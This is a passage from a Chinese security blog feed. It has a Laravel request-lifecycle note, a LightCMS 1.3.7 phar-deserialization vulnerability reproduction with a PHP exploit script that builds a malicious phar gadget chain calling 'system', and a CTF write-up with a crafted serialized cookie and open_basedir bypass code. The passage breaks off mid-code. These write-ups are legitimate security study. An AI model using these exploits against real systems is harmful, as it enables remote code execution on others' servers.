class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">index.php<br>bootstrap/autoload.php      --&gt; 自动加载<br>bootstrap/app.php           --&gt; 初始化服务容器(注册基础的服务提供者(事件、日志、路由)、注册核心类别名)<br>bootstrap/app.php           --&gt; 注册共享的Kernel和异常处理器<br>Foundation\\Http\\Kernel.php  --&gt; 处理请求和响应<br>index.php                   --&gt; 将响应信息发送到浏览器<br>index.php                   --&gt; 处理继承自TerminableMiddleware接口的中间件（Session）并结束应用生命周期<br><br>其中处理请求和响应包括：<br>    解析Illuminate\\Contracts\\Http\\Kernel，实例化App\\Http\\Kernel<br>    a. 实例化Kernel ： 构造函数：设置<span class="hljs-variable">$app</span>/<span class="hljs-variable">$router</span>，初始化<span class="hljs-variable">$router</span>中middleware数值<br>    b. handle处理请求：<br>        加载路由中间件、加载环境变量、加载配置文件、加载异常处理机制、注册门面、注册服务提供者、启动服务提供者、管道模式注入中间件<br>    c.将响应信息发送到浏览器<br>        注册request实例到容器 (<span class="hljs-variable">$app</span>[\<span class="hljs-string">&#x27;request\&#x27;]-&gt;Illuminate\\Http\\Request)  --  $request是经过Symfony封装的请求对象</span><br><span class="hljs-string">        清空之前容器中的request实例</span><br><span class="hljs-string">        调用bootstrap方法，启动一系列启动类的bootstrap方法：</span><br><span class="hljs-string">        Illuminate\\Foundation\\Bootstrap\\DetectEnvironment  环境配置（$app[‘env’]）</span><br><span class="hljs-string">        Illuminate\\Foundation\\Bootstrap\\LoadConfiguration  基本配置（$app[‘config’]）</span><br><span class="hljs-string">        Illuminate\\Foundation\\Bootstrap\\ConfigureLogging   日志文件（$app[‘log’]）</span><br><span class="hljs-string">        Illuminate\\Foundation\\Bootstrap\\HandleExceptions   错误&amp;异常处理</span><br><span class="hljs-string">        Illuminate\\Foundation\\Bootstrap\\RegisterFacades    清除已解析的Facade并重新启动，注册config文件中alias定义的所有Facade类到容器</span><br><span class="hljs-string">        Illuminate\\Foundation\\Bootstrap\\RegisterProviders  注册config中providers定义的所有Providers类到容器</span><br><span class="hljs-string">        Illuminate\\Foundation\\Bootstrap\\BootProviders      调用所有已注册Providers的boot方法</span><br><span class="hljs-string">        通过Pipeline发送请求，经过中间件，再由路由转发，最终返回响应</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">1.自动加载</span><br><span class="hljs-string">    包括全局函数的加载、顶级命名空间映射、PSR0、PSR4标准的实现</span><br><span class="hljs-string"></span><br><span class="hljs-string">2.初始化服务容器</span><br><span class="hljs-string">    注册容器本身</span><br><span class="hljs-string">        将基本的绑定注册到容器中，包括容器自身、容器实例名称app</span><br><span class="hljs-string">        实例化</span><br><span class="hljs-string">            app, Illuminate\\Container\\Container</span><br><span class="hljs-string">        关键代码：</span><br><span class="hljs-string">            protected function registerBaseBindings() &#123;</span><br><span class="hljs-string">                static::setInstance($this);</span><br><span class="hljs-string">                $this-&gt;instance(\&#x27;app\&#x27;, $this);</span><br><span class="hljs-string">                $this-&gt;instance(Container::class, $this);</span><br><span class="hljs-string">            &#125;</span><br><span class="hljs-string">    注册基础服务提供者</span><br><span class="hljs-string">        向容器分别注册了Key为以下值得实例</span><br><span class="hljs-string">            events</span><br><span class="hljs-string">            log</span><br><span class="hljs-string">            router、url、redirect、Illuminate\\Contracts\\Routing\\ResponseFactory</span><br><span class="hljs-string">        关键代码：</span><br><span class="hljs-string">            protected function registerBaseServiceProviders() &#123;</span><br><span class="hljs-string">                $this-&gt;register(new EventServiceProvider($this));</span><br><span class="hljs-string">                $this-&gt;register(new LogServiceProvider($this));</span><br><span class="hljs-string">                $this-&gt;register(new RoutingServiceProvider($this));</span><br><span class="hljs-string">            &#125;</span><br><span class="hljs-string">    注册容器别名(注册共享的Kernel)</span><br><span class="hljs-string">        在调用此方法之前，我们想取得一个容器实例的做法是 App::make(\&#x27;app\&#x27;);</span><br><span class="hljs-string">        现在我们可以使用三种方法来取得一个容器实例app</span><br><span class="hljs-string">                    App::make(\&#x27;Illuminate\\Foundation\\Application\&#x27;)</span><br><span class="hljs-string">                    App::make(\&#x27;Illuminate\\Contracts\\Container\\Container\&#x27;)</span><br><span class="hljs-string">                    App::make(\&#x27;Illuminate\\Contracts\\Foundation\\Application\&#x27;)</span><br><span class="hljs-string">        关键代码：</span><br><span class="hljs-string">            public function registerCoreContainerAliases()&#123;</span><br><span class="hljs-string">                ...</span><br><span class="hljs-string">            &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">3. 注册共享的Kernel和异常处理器</span><br><span class="hljs-string">        关键代码：</span><br><span class="hljs-string">            $app-&gt;singleton(</span><br><span class="hljs-string">                Illuminate\\Contracts\\Http\\Kernel::class,</span><br><span class="hljs-string">                App\\Http\\Kernel::class</span><br><span class="hljs-string">            );</span><br><span class="hljs-string"></span><br><span class="hljs-string">            $app-&gt;singleton(</span><br><span class="hljs-string">                Illuminate\\Contracts\\Console\\Kernel::class,</span><br><span class="hljs-string">                App\\Console\\Kernel::class</span><br><span class="hljs-string">            );</span><br><span class="hljs-string"></span><br><span class="hljs-string">            $app-&gt;singleton(</span><br><span class="hljs-string">                Illuminate\\Contracts\\Debug\\ExceptionHandler::class,</span><br><span class="hljs-string">                App\\Exceptions\\Handler::class</span><br><span class="hljs-string">            );</span><br><span class="hljs-string"></span><br><span class="hljs-string">4. 处理请求和响应</span><br><span class="hljs-string">        实例化App\\Http\\Kernel</span><br><span class="hljs-string">        构造函数：设置$app/$router，初始化$router中middleware数值</span><br><span class="hljs-string">        关键代码：</span><br><span class="hljs-string">                public function __construct(Application $app, Router $router)</span><br><span class="hljs-string">                &#123;</span><br><span class="hljs-string">                    $this-&gt;app = $app;</span><br><span class="hljs-string">                    $this-&gt;router = $router;</span><br><span class="hljs-string"></span><br><span class="hljs-string">                    $router-&gt;middlewarePriority = $this-&gt;middlewarePriority;</span><br><span class="hljs-string"></span><br><span class="hljs-string">                    foreach ($this-&gt;middlewareGroups as $key =&gt; $middleware) &#123;</span><br><span class="hljs-string">                        $router-&gt;middlewareGroup($key, $middleware);</span><br><span class="hljs-string">                    &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">                    foreach ($this-&gt;routeMiddleware as $key =&gt; $middleware) &#123;</span><br><span class="hljs-string">                        $router-&gt;aliasMiddleware($key, $middleware);</span><br><span class="hljs-string">                    &#125;</span><br><span class="hljs-string">                &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">5. handle处理请求</span><br><span class="hljs-string">        a. 注册request实例到容器 ($app[\&#x27;request\&#x27;]-&gt;Illuminate\\Http\\Request)  --  $request是经过Symfony封装的请求对象</span><br><span class="hljs-string">        b. 清空之前容器中的request实例</span><br><span class="hljs-string">        c. 调用bootstrap方法，启动一系列启动类的bootstrap方法</span><br><span class="hljs-string">        d. 通过Pipeline发送请求，经过中间件，再由路由转发，最终返回响应</span><br><span class="hljs-string"></span><br><span class="hljs-string">        关键代码：</span><br><span class="hljs-string">            protected function sendRequestThroughRouter($request)</span><br><span class="hljs-string">            &#123;</span><br><span class="hljs-string">                $this-&gt;app-&gt;instance(\&#x27;request\&#x27;, $request);</span><br><span class="hljs-string"></span><br><span class="hljs-string">                Facade::clearResolvedInstance(\&#x27;request\&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">                $this-&gt;bootstrap();</span><br><span class="hljs-string"></span><br><span class="hljs-string">                return (new Pipeline($this-&gt;app))</span><br><span class="hljs-string">                            -&gt;send($request)</span><br><span class="hljs-string">                            -&gt;through($this-&gt;app-&gt;shouldSkipMiddleware() ? [] : $this-&gt;middleware)</span><br><span class="hljs-string">                            -&gt;then($this-&gt;dispatchToRouter());</span><br><span class="hljs-string">            &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">6. bootstrap方法</span><br><span class="hljs-string">        a.检测环境变量文件是否正常</span><br><span class="hljs-string">        b.取得配置文件，即把/config/下的所有配置文件读取到容器（app()-&gt;make(\&#x27;config\&#x27;)可以查看所有配置信息）</span><br><span class="hljs-string">        c.注册异常： set_error_handler,set_exception_handler, register_shutdown_function</span><br><span class="hljs-string">        d.把/config/app.php里面的aliases项利用PHP库函数class_alias创建别名，从此，我们可以使用App::make(\&#x27;app\&#x27;)方式取得实例</span><br><span class="hljs-string">        e.把/config/app.php里面的providers项,注册到容器</span><br><span class="hljs-string">        f.运行容器中注册的所有的ServiceProvider中得boot方法</span><br><span class="hljs-string"></span><br><span class="hljs-string">        关键代码：</span><br><span class="hljs-string">            protected $bootstrappers = [</span><br><span class="hljs-string">                \\Illuminate\\Foundation\\Bootstrap\\LoadEnvironmentVariables::class,</span><br><span class="hljs-string">                \\Illuminate\\Foundation\\Bootstrap\\LoadConfiguration::class,</span><br><span class="hljs-string">                \\Illuminate\\Foundation\\Bootstrap\\HandleExceptions::class,</span><br><span class="hljs-string">                \\Illuminate\\Foundation\\Bootstrap\\RegisterFacades::class,</span><br><span class="hljs-string">                \\Illuminate\\Foundation\\Bootstrap\\RegisterProviders::class,</span><br><span class="hljs-string">                \\Illuminate\\Foundation\\Bootstrap\\BootProviders::class,</span><br><span class="hljs-string">            ];</span><br><span class="hljs-string"></span><br><span class="hljs-string">7. 将响应信息发送到浏览器</span><br><span class="hljs-string">        关键代码：</span><br><span class="hljs-string">            $response-&gt;send();</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">9. 处理继承自TerminableMiddleware</span><br><span class="hljs-string">        关键代码：</span><br><span class="hljs-string">            $kernel-&gt;terminate($request, $response);</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">10. Laravel路由</span><br><span class="hljs-string">    $this-&gt;dispatchToRouter()</span><br><span class="hljs-string">    --&gt; $this-&gt;router-&gt;dispatch($request)</span><br><span class="hljs-string">    --&gt; $this-&gt;dispatchToRoute($request);  -- /Illuminate/Routing/Router.php</span><br><span class="hljs-string">    --&gt; $response = $this-&gt;runRouteWithinStack($route, $request);</span><br><span class="hljs-string"></span><br><span class="hljs-string">    //干货来了</span><br><span class="hljs-string">    protected function runRouteWithinStack(Route $route, Request $request)</span><br><span class="hljs-string">    &#123;</span><br><span class="hljs-string">        // 取得routes.php里面的Middleware节点</span><br><span class="hljs-string">        $middleware = $this-&gt;gatherRouteMiddlewares($route);</span><br><span class="hljs-string">        //这个有点眼熟</span><br><span class="hljs-string">        return (new Pipeline($this-&gt;container))</span><br><span class="hljs-string">                -&gt;send($request)</span><br><span class="hljs-string">                -&gt;through($middleware)    //执行上述的中间件</span><br><span class="hljs-string">                -&gt;then(function($request) use ($route)</span><br><span class="hljs-string">                &#123;</span><br><span class="hljs-string">                    //不容易啊，终于到Controller类了</span><br><span class="hljs-string">                    return $this-&gt;prepareResponse(</span><br><span class="hljs-string">                        $request,</span><br><span class="hljs-string">                        $route-&gt;run($request); //run控制器</span><br><span class="hljs-string">                    );</span><br><span class="hljs-string">                &#125;);</span><br><span class="hljs-string">    &#125;</span><br></code></pre></div></td></tr></table></figure><h2 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h2>]]></content>
    
    
    <categories>
      
      <category>laravel</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>laravel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LightCMS1.3.7漏洞复现</title>
    <link href="/2021/07/02/2021-7-2-LightCMS1.3.7/"/>
    <url>/2021/07/02/2021-7-2-LightCMS1.3.7/</url>
    
    <content type="html"><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><p><code>lightCMS</code>是一个轻量级的<code>CMS</code>系统，也可以作为一个通用的后台管理框架使用。<code>lightCMS</code>集成了用户管理、权限管理、日志管理、菜单管理等后台管理框架的通用功能，同时也提供模型管理、分类管理等<code>CMS</code>系统中常用的功能。</p><h5 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h5><figure class="highlight cmd"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cmd"><span class="hljs-built_in">cd</span> /var/www/html<br>git clone https://hub.fastgit.org/eddy8/LightCMS.git<br><span class="hljs-built_in">cd</span> lightCMS<br>composer install<br>sudo chmod <span class="hljs-number">777</span> -R storage/ bootstrap/cache/<br>cp .env.example .env<br><br>数据库配置：<br>CREATE DATABASE homestead;<br>CREATE USER &#x27;homestead&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;secret&#x27;;<br>GRANT ALL PRIVILEGES ON *.* TO &#x27;homestead&#x27;@&#x27;localhost&#x27;;<br>FLUSH PRIVILEGES;<br><br>php artisan migrate --seed<br>php artisan serve <br><br>途中可能回遇到一些php-mysql依赖没有安装，<br>sudo apt-get install php7.<span class="hljs-number">4</span>-xsl php7.<span class="hljs-number">4</span>-mbstring php7.<span class="hljs-number">4</span>-intl -y php7.<span class="hljs-number">4</span>-gd对应你自己的安装即可<br></code></pre></div></td></tr></table></figure><p>laravel框架属实还没学明白，只能照着网上的复现，这个漏洞出在 <code>app/Http/Controllers/Admin/NEditorController.php</code>中的上传图片的功能：</p><p><img src="https://img-blog.csdnimg.cn/20210704175218866.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>知道漏洞发生在哪了，我自己先分析了下这串代码，</p><blockquote><p>关于config函数config 函数</p><p>如果我要的配置不在.env 文件中而在 mail.php 文件中，我要临时设置和读取该怎么办，这个时候我们就要使用 config 函数了，这个函数在使用上有些特色，我们一一说。</p><p>比如我现在要读取 mail.php 文件中的 driver 配置项，可以使用 config(‘mail.driver’), 如果要获取 mail.php 文件中所有的配置项可以使用 config(‘mail’)，注意两种方式的区别。</p><p>如果我们想临时的修改配置，但是又不像让它生效，可以使用 config([‘mail.driver’=&gt;’sendmail’])，这样邮箱配置中的驱动配置就改为了 sendmail，不过这种方式是临时的，并不会写入到配置文件中。</p><p>先用过滤器过滤变量，初始化curl话柄来获取远程资源的内容，然后使用 Image:make 模块进行解析用imagecreatefromwebp获得的WebP 图像文件，</p><table><thead><tr><th align="center"><strong>文件名称</strong></th><th align="right"><strong>配置类型</strong></th></tr></thead><tbody><tr><td align="center">app.php</td><td align="right">应用相关，如项目名称、时区、语言等</td></tr><tr><td align="center">auth.php</td><td align="right">用户授权，如用户登录、密码重置等</td></tr><tr><td align="center">broadcasting.php</td><td align="right">事件广播系统相关配置</td></tr><tr><td align="center">cache.php</td><td align="right">缓存相关配置</td></tr><tr><td align="center">database.php</td><td align="right">数据库相关配置，包括 MySQL、Redis 等</td></tr><tr><td align="center">filesystems.php</td><td align="right">文件存储相关配置</td></tr><tr><td align="center">mail.php</td><td align="right">邮箱发送相关的配置</td></tr><tr><td align="center">queue.php</td><td align="right">队列系统相关配置</td></tr><tr><td align="center">services.php</td><td align="right">放置第三方服务配置</td></tr><tr><td align="center">session.php</td><td align="right">用户会话相关配置</td></tr><tr><td align="center">view.php</td><td align="right">视图存储路径相关配置</td></tr></tbody></table></blockquote><p><img src="https://img-blog.csdnimg.cn/20210704175147723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>这里config函数读取light.image_upload.driver的值，判断是不是上传到本地，如果不是的话就获取class然后实例化，回调catchImage函数</p><p>然后获取请求结果，转换为数组去重，接着遍历数组，随后跟进fetch Image File函数</p><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20210703021425786.png" alt="image-20210703021425786"></p><p>可以看到先用过滤器看是否<code>$url</code>是否是<code>url</code>。注意这不仅http协议可以通过，其它如phar协议同样也可以。接着尝试 curl 访问 url，并返回结果给<code>$data</code>，然后通过<code>isWebp()</code>判断<code>$data</code>是否是 webp 文件，其中会调用<code>Intervention\\Image\\Facades\\Image</code>的 make方法，对图片内容进行解析</p><p>逐步跟进<code>vendor/intervention/image/src/Intervention/Image/ImageManager.php</code></p><p><img src="https://img-blog.csdnimg.cn/20210703171304422.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>继续跟进到<code>vendor/intervention/image/src/intervention/Image/AbstractDriver.php</code>，通过 <code>init()</code>，然后传入 <code>decoder-&gt;init()</code></p><p><img src="https://img-blog.csdnimg.cn/20210703171404901.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>跟进init到<code>vendor/intervention/image/src/Intervention/Image/AbstractDecoder.php</code></p><p><img src="https://img-blog.csdnimg.cn/20210704175114220.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>查看 <code>isUlr()</code> 方法，同样也是判断<code>$data</code>是否为 url，这时<code>$data</code>是 phar 协议，可以 return true，所以 <code>$data</code>传入<code>initFromUrl()</code></p><p><img src="https://img-blog.csdnimg.cn/20210703171548952.png" alt="在这里插入图片描述"></p><p>查看<code>initFromUrl()</code>方法，可以看到 <code>file_get_contents()</code> 触发 phar 反序列化</p><p><img src="https://img-blog.csdnimg.cn/20210703171738283.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>exp如下</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>   <span class="hljs-keyword">namespace</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Broadcasting</span>&#123; //创建一个事件并将数组中的事件（键）和事件监听者（数组的键值）进行绑定<br>    <span class="hljs-title">protected</span> $<span class="hljs-title">events</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$evnet</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;event = <span class="hljs-keyword">new</span> Dispatcher(<span class="hljs-variable">$cmd</span>);<br>        <span class="hljs-keyword">$this</span>-&gt;events = <span class="hljs-variable">$events</span>;<br>    &#125;<br>&#125;<br>    <span class="hljs-keyword">namespace</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Events</span>&#123;<br>        <br>        <span class="hljs-title">class</span> <span class="hljs-title">Dispatcher</span>&#123;  //触发事件类<br>            <span class="hljs-title">protected</span> $<span class="hljs-title">listeners</span>;<br>            <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;listeners=[<span class="hljs-variable">$event</span>=&gt;[<span class="hljs-string">&#x27;system&#x27;</span>]];<br>            &#125;<br>        &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span>&#123;<br>    $phar = new Phar(&#x27;phar.phar&#x27;);  //后缀名必须为phar<br>    <span class="hljs-variable">$phar</span> -&gt; startBuffering();<br>    <span class="hljs-variable">$phar</span> -&gt; setStub(<span class="hljs-string">&#x27;GIF89a&#x27;</span>.<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>); <span class="hljs-comment">//设置stub</span><br>    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> Illuminate\Broadcasting\PendingBroadcast(<span class="hljs-string">&#x27;ls /&#x27;</span>);<br>    <span class="hljs-keyword">echo</span> base64_encode(serialize(<span class="hljs-variable">$o</span>));<br>    <span class="hljs-variable">$phar</span> -&gt; setMetadata(<span class="hljs-variable">$o</span>);   <span class="hljs-comment">//将自定义的meta-data存入manifest</span><br>    <span class="hljs-variable">$phar</span> -&gt; addFromString(<span class="hljs-string">&#x27;test.txt&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);  <span class="hljs-comment">//添加要压缩的文件 </span><br>   <span class="hljs-variable">$phar</span> -&gt; stopBuffering();  <span class="hljs-comment">//签名自动计算</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>具体的laravel事件机制可以看看</p><p>[]: <a href="https://blog.csdn.net/qq_16877261/article/details/79095039?utm_source=blogxgwz0">https://blog.csdn.net/qq_16877261/article/details/79095039?utm_source=blogxgwz0</a></p><p><img src="https://img-blog.csdnimg.cn/20210704173030893.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20210704173050552.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>最后在发包即可</p><p><img src="https://img-blog.csdnimg.cn/20210704175044902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>LightCMS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>LightCMS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>one_Pointer_php</title>
    <link href="/2021/06/03/2021-6-3-%E8%93%9D%E5%B8%BDweb/"/>
    <url>/2021/06/03/2021-6-3-%E8%93%9D%E5%B8%BDweb/</url>
    
    <content type="html"><![CDATA[<h2 id="one-Pointer-php"><a href="#one-Pointer-php" class="headerlink" title="one_Pointer_php"></a>one_Pointer_php</h2><h3 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h3><ul><li>利用整数溢出获取webshell</li><li>open_basedir的绕过</li><li>disable_function绕过（伪造FastCGI请求PHP-CGI）</li><li>恶意ftp服务直接打</li></ul><p>题目给了源码，两个php文件，代码比较简单，需要绕过$count[]=1进入到eval命令执行</p><h4 id="php-整数溢出"><a href="#php-整数溢出" class="headerlink" title="php 整数溢出"></a>php 整数溢出</h4><blockquote><p>在 PHP 中，整型数是有一个范围的，对于32位的操作系统，最大的整型是2147483647，即2的31次方，最小为-2的31次方。如果给定的一个整数超出了整型（integer）的范围，将会被解释为浮点型（float）。同样如果执行的运算结果超出了整型（integer）范围，也会返回浮点型（float）。</p></blockquote><p>则可以利用如下</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$userconut</span> = <span class="hljs-number">9223372036854775806</span>;<br><span class="hljs-variable">$count</span>[++<span class="hljs-variable">$userconut</span>]=<span class="hljs-number">1</span>;<br><span class="hljs-variable">$count</span>[]=<span class="hljs-number">1</span>;<br>print_r(<span class="hljs-variable">$count</span>);<br></code></pre></div></td></tr></table></figure><p>得到</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">PHP Warning:  Cannot add element to the <span class="hljs-keyword">array</span> <span class="hljs-keyword">as</span> the next element is already occupied in C:\Users\LiuSir\Desktop\www\index.php on line <span class="hljs-number">4</span><br><br>Warning: Cannot add element to the <span class="hljs-keyword">array</span> <span class="hljs-keyword">as</span> the next element is already occupied in C:\Users\LiuSir\Desktop\www\index.php on line <span class="hljs-number">4</span><br><span class="hljs-keyword">Array</span><br>(<br>    [<span class="hljs-number">9223372036854775807</span>] =&gt; <span class="hljs-number">1</span><br>)<br>[Finished in <span class="hljs-number">0.2</span>s]<br></code></pre></div></td></tr></table></figure><p>可以看到代码报错了。这是因为先让</p><figure class="highlight elixir"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elixir"><span class="hljs-variable">$user</span>-&gt;count 为 PHP_INT_MAX - <span class="hljs-number">1</span>，<br></code></pre></div></td></tr></table></figure><p>自增之后，数组 count 的最大键为 PHP_INT_MAX，此时 $count[]=1，新键等于数组的最大键+1，键值为1，这里键为 PHP_INT_MAX + 1，导致报错，返回值为0，然后就可以成功绕过并进入到 eval() 中了。</p><p>拿到url编码后的序列化数据，改cookie即可进行eval执行命令</p><blockquote><p>data=O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D;</p></blockquote><p>发现disable_function<br><img src="https://img-blog.csdnimg.cn/20210603151340468.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>open_basedir<br><img src="https://img-blog.csdnimg.cn/20210603151416151.png" alt="在这里插入图片描述"></p><h4 id="绕过open-basedir"><a href="#绕过open-basedir" class="headerlink" title="绕过open_basedir"></a>绕过open_basedir</h4><ul><li>ini_set绕过绕过<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">mkdir(<span class="hljs-string">&#x27;z33&#x27;</span>);<br>chdir(<span class="hljs-string">&#x27;z33&#x27;</span>);<br>ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>);<br>chdir(<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);<br>ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<br></code></pre></div></td></tr></table></figure>或者glob协议绕过<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 